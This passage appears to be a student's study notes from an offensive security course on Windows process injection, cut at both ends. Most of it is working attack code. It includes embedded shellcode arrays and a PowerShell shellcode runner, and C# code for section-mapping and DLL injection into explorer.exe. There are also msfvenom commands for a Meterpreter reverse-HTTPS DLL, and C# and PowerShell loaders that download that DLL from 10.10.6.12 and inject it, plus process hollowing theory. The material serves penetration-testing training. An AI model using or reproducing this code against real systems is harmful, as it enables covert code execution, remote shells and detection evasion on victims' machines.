b8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5


$dQNOxwzloVP = $nFHoxupEYPGPRa::VirtualAlloc(0,[Math]::Max($OgJxdhLHmMl.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($OgJxdhLHmMl,0,$dQNOxwzloVP,$OgJxdhLHmMl.Length)

$nFHoxupEYPGPRa::CreateThread(0,0,$dQNOxwzloVP,0,0,0)

```


### 5.1.2.2 Extra Mile

Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is 
considered a standard technique, but there are a few others to consider.
The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and 
NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
Create C# code that performs process injection using the four new APIs instead of VirtualAllocEx
and WriteProcessMemory. Convert the code to Jscript with DotNetToJscript. Note that 
CreateRemoteThread must still be used to execute the shellcode

https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection


need to make changes into nt function above.

Copied from someplace

```C#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace c_hash_project
{
    class Program
    {
        // OpenProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // CreateRemoteThread - kernel32.dll
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        // GetCurrentProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        // ntdll.dll API functions:
        // NtCreateSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        // NtMapViewOfSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        // NtUnmapViewOfSection
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        // NtClose
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        static int Main(string[] args)
        {
            byte[] buf = new byte[319] {
            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
            0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
            0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
            0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
            0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
            0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
            0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
            0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
            0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
            0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
            0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
            0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
            0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
            0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
            0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
            0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
            0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
            0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
            0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
            0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
            0x1c,0x05,0x92,0x1b };
            long buffer_size = buf.Length;

            // Create the section handle.
            IntPtr ptr_section_handle = IntPtr.Zero;
            // fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while creating the section.");
                return -1;
            }
            Console.WriteLine("[+] The section has been created successfully.");
            Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));

            // Map a view of a section into the virtual address space of the current process.
            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                return -1;
            }
            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
            Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

            // Copy the shellcode into the mapped section.
            //memcpy(localSectionAddress, buf, sizeof(buf));
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            // Map a view of the section in the virtual address space of the targeted process.
            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            // fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                return -1;
            }
            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
            Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

            // Unmap the view of the section from the current process & close the handle.
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
    }
}
```


To read
https://www.fergonez.net/post/shellcode-csharp

To put any kind of shellcode into csharp.


# DLL injection

Sometimes we wantto inject an entire dll inside a code

# DLL injection theory

LoadlIbrary is how we need to run. Hoever we cant force a remote process to do it just like that
so instead we will need to trick. The server.

 Recall that when calling CreateRemoteThread, the fourth argument is the start address
of the function run in the new thread and the fifth argument is the memory address of a buffer
containing arguments for that function

he idea is to resolve the address of LoadLibraryA inside the remote process and invoke it while
supplying the name of the DLL we want to load. If the address of LoadLibraryA is given as the
fourth argument to CreateRemoteThread, it will be invoked when we call CreateRemoteThread.

In order to supply the name of the DLL to LoadLibraryA, we must allocate a buffer inside the
remote process and copy the name and path of the DLL into it. The address of this buffer can
then be given as the fifth argument to CreateRemoteThread, after which it will be used with
LoadLibrary.

but  the DLL must be written in C or
C++ and must be unmanaged. The managed C#-based DLL we have been working with so far will
not work because we can not load a managed DLL into an unmanaged process.

DLLs normally contain APIs that are called after the DLL is loaded. In order to call these
APIs, an application would first have to “resolve” their names to memory addresses through the
use of GetProcAddress. Since GetProcAddress cannot resolve an API in a remote process, we
must craft our malicious DLL in a non-standard way

structure of a DLL

```
BOOL WINAPI DllMain(
 _In_ HINSTANCE hinstDLL,
 _In_ DWORD fdwReason,
 _In_ LPVOID lpvReserved
);
```
unmanaged code

```
BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
 switch (ul_reason_for_call)
 {
 case DLL_PROCESS_ATTACH:
 case DLL_THREAD_ATTACH:
 case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
 break;
 }
 return TRUE;
}
```

# DLL injection with C#

lets try and generate a dll with msfvenom

```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https
LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll


└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=4444 EXIT_FUNC=THREAD -f dll -o /var/www/html/met.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 652 bytes
Final size of dll file: 8704 bytes
Saved as: /var/www/html/met.dll

```

We will create a chash program that will fetch dll from attackers server. and then we wll write the DLL to disk since LoadLibrary only accepts files present on disk.

NOt able to inject into notepad

able to inject calc-

```
└─# msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o /var/www/html/calc.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of dll file: 8704 bytes
Saved as: /var/www/html/calc.dll

```

```C#
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
namespace download_dll
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
       processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
       dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
       byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
       lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
       dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
       SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            String dir =
           Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://10.10.6.12/met.dll", dllName);
            Process[] expProc = Process.GetProcessesByName("explorer");
            Console.WriteLine("Length of the array is : ", (uint) expProc.Length);
            int pid = expProc[0].Id;
            Console.WriteLine(pid);
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr,
           Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
           addr, 0, IntPtr.Zero);
        }
    }
}
```

### 5.2.2.1 Exercise
1. Recreate the DLL injection technique and inject a Meterpreter DLL into explorer.exe from a 
Jscript file using DotNetToJscript.

# Reflective DLL Injection Theory

Since we do not need to rely on GetProcAddress and want to avoid detection, we are only 
interested in the memory mapping of the DLL. Reflective DLL injection parses the relevant fields 
of the DLL’s Portable Executable260 (PE) file format and maps the contents into memory.

In order to implement reflective DLL injection, we could write custom code to essentially recreate 
and improve upon the functionality of LoadLibrary. Since the inner workings of the code and the 
details of the PE file format are beyond the scope of this module, we will instead reuse existing 
code to execute these techniques.

# reflective dll injection in powershell

We’ll reuse the PowerShell reflective DLL injection code (Invoke-ReflectivePEInjection261) 
developed by the security researchers Joe Bialek and Matt Graeber

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

Not running -

```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.6.12/met.dll')
$procid = (Get-Process -Name explorer).Id

Import-Module "C:\Users\misthios\codeplay\pen300\book\chapter5\invoke_reflective_injection.ps1" 

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

### 5.3.2.1 Exercises
1. Use Invoke-ReflectivePEInjection to launch a Meterpreter DLL into a remote process and 
obtain a reverse shell. Note that Invoke-ReflectivePEInjection.ps1 is in the C:\Tools folder on 
the Windows 10 development VM.
2. Copy Invoke-ReflectivePEInjection to your Kali Apache web server and create a small 
PowerShell download script that downloads and executes it directly from memory.

# Process hollowing

The problem is that all svchost.exe processes run by default at SYSTEM integrity level, meaning
we cannot inject into them from a lower integrity level. Additionally, if we were to launch
svchost.exe (instead of Notepad) and attempt to inject into it, the process will immediately
terminate.
To address this, we will launch a svchost.exe process and modify it before it actually starts
executing. This is known as Process Hollowing263 and should execute our payload without
terminating it

# Process hollowing theory

We use CREATE_SUSPENDED flag during process creation.

CreateProcess API the OS does three things:

1.  create virtual memory space for the new process
2.  allocates thestack along with the Thread Environment Block and the Process Environment blocl
3.  loads the required DLLs and thhe EXE into memory

If we supply the
CREATE_SUSPENDED flag when calling CreateProcess, the execution of the thread is halted just
before it runs the EXE’s first instruction.

At this point, we would locate the EntryPoint of the executable and overwrite its in-memory
content with our staged shellcode and let it continue to execute.

Locating the EntryPoint is a bit tricky due to ASLR268 but once the new suspended process is
created, we can turn to the Win32 ZwQueryInformationProcess269 API to retrieve certain
information about the target process, including its PEB address

Locating the EntryPoint is a bit tricky due to ASLR268 but once the new suspended process is
created, we can turn to the Win32 ZwQueryInformationProcess269 API to retrieve certain
information about the target process, including its PEB address. From the PEB we can obtain the
base address of the process which we can use to parse the PE headers and locate the EntryPoint.

Specifically, when calling ZwQueryInformationProcess, we must supply an enum from the
ProcessInformationClass class. If we choose the ProcessBasicInformation class, we can obtain
the address of the PEB in the suspended process. We can find the base address of the executable
at offset 0x10 bytes into the PEB.

Next, we need to read the EXE base address. While ZwQueryInformationProcess yields the
address of the PEB, we must read from it, which we cannot do directly because it’s in a remote
process. To read from a remote process, we’ll use the ReadProcessMemory270 API, which is a
counterpart to WriteProcessMemory. This allows us to read out the contents of the remote PEB at
offset 0x10.

Base address of the Executable at 0x10 bytes into the PEB
0x3c e_lfanew which is th eoffset from the beginning of PE to the PE Header
0x28 from PE header is Entrypoint Relative Virtual Adress (RVA) 

As the name suggests, the RVA is just
an offset and needs to be added to the remote process base address to obtain the absolute
virtual memory address of the EntryPoint. 
 Finally, we have the desired start address for our
shellcode.

Do it with a calculator
For example PEB if located at address 0x3004000
base address will be at 0x3004010 
at that lcation the address is 07ffff01000000

7FFF F010 003C wiil be e_lfanew will be the offset of PE header

example value of 0x110 meaning the PE header is at 07ffff01000110

 0x7ffff01000138 we will have RVA -  this we add to the base address we already got
 0x7ffff0100000

# Process hollowing in C#

looking at ZwQueryInformationProcess - THe functions prefix Nt or Zw indicates that the api can be called by either a usermode program or by a kernla based program

```C#
using System;
using System.Runtime.InteropServices;
using System.Threading;



namespace Hollow
{

    internal class Program
    {
        

        // This also works with CharSet.Ansi as long as the calling function uses the same character set.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            public NtStatus ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        public enum NtStatus : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
